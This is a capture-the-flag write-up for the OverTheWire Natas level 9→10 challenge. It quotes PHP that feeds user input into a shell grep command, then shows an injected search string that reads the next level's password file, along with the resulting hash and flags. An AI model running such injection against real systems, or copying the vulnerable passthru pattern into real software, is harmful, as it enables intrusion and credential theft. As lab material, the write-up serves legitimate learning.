# Natas Level 9 → Level 10 Command Injection w/ some filter

## Previous Flag
<b>t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu</b>

## Goal
Username: natas10<br>
URL: http://natas10.natas.labs.overthewire.org<br>

For security reasons, we now filter on certain characters<br>
Find words containing: <br>
Output:<br>
View sourcecode

## What I learned
```
Since relied on passthru w/ grep can still search
```

## Solution
```
Click View source code
http://natas10.natas.labs.overthewire.org/index-source.html 

<div id="content">
For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) { 👀
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>

Find words containing: .* /etc/natas_webpass/natas11 # ⌨️
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$apr1$tmwSSiSr$r/7J.9AX6rzxuvTp4BntO1
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk 🔐
```

## Flag
<b>UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk</b>

## Continue
[Continue](/overthewire/Natas1011.md)